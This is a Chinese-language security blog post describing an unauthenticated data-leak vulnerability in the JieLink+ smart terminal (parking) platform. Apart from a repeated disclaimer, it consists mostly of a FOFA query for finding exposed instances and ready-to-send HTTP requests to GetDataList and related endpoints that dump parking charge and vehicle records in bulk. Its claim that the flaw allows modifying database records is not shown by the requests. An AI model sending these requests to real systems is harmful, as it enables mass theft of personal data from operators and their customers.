> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkzNzMxODkzMw==&mid=2247485941&idx=1&sn=19933a1c4ce9672ea5adef1f97618da7

#  JieLink+智能终端操作平台 GetDataList 敏感信息泄露漏洞  
 HK安全小屋   2025-06-15 14:59  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
漏洞描述：  
  
JieLink+智能终端操作平台多个接口处存在敏感信息泄露漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。  
  
  
影响版本：  
  
JieLink+智能终端操作平台  
  
  
FOFA:  

```
title=&#34;JieLink+智能终端操作平台&#34;
```

  
  
POC：  

```
POST /report/ParkChargeRecord/GetDataList HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
page=1&rows=20000
```

  
成功获取模板信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI2FLfCCwxqka2JT51Udics0DTwUCvia6SUjlBfYlMYlx6Ry0BBS9AsGZ6jxGiaU6pqbttQtMNoVJIfcg/640?wx_fmt=png&from=appmsg "")  
  
还有两个利用点如下：  
  
POC1-POC2  

```
GET /Report/ParkCommon/GetParkInThroughDeivces HTTP/1.1
Host:
```


```
GET /report/ParkOutRecord/GetDataList HTTP/1.1
Host:
```

  
  
  
  
  
--------  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
  
  
